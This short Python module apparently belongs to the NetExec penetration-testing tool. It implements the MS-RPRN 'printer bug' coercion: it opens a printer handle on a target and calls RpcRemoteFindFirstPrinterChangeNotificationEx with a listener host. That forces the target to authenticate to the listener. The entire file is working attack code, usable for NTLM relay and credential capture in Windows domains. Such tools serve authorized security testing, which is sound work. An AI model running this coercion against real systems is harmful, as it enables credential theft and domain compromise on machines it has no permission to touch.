from impacket.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB, RpcRemoteFindFirstPrinterChangeNotificationEx, hRpcOpenPrinter

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


def request(dce, target, listener):
    resp = hRpcOpenPrinter(dce, f"\\\\{target}\x00")

    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
    request = RpcRemoteFindFirstPrinterChangeNotificationEx()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = PRINTER_CHANGE_ADD_JOB
    request["pszLocalMachine"] = f"\\\\{listener}\x00"
    request["fdwOptions"] = 0x00000000
    request["dwPrinterLocal"] = 0
    dce.request(request)